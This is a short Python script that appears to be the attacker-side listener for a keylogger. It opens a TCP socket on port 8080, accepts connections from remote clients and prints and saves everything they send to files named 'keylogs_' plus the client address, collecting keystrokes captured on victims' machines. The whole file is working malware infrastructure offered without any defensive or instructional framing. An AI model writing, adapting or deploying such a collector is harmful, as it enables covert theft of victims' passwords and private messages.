import socket

while True:
    s = socket.socket()
    print("")
    print("Socket created.")

    port = 8080

    s.bind(('0.0.0.0', port))
    print("Socket binded to ", port)

    s.listen(5)
    print("Socket is listening...")


    c, addr = s.accept()
    print("Got connection from ", addr)

    f = open(f"keylogs_{addr}.txt", "w")
    
    while True:
        try:
            key = c.recv(1024).decode()
            if len(key)==0:
                print("")
                print("Client must have disconnected.")
                f.close()
                break
            print(key, end="", flush=True)
            f.write(key)
            f.flush()
        except:
            print("")
            print("Client must have disconnected.")
            f.close()
            break
    c.close()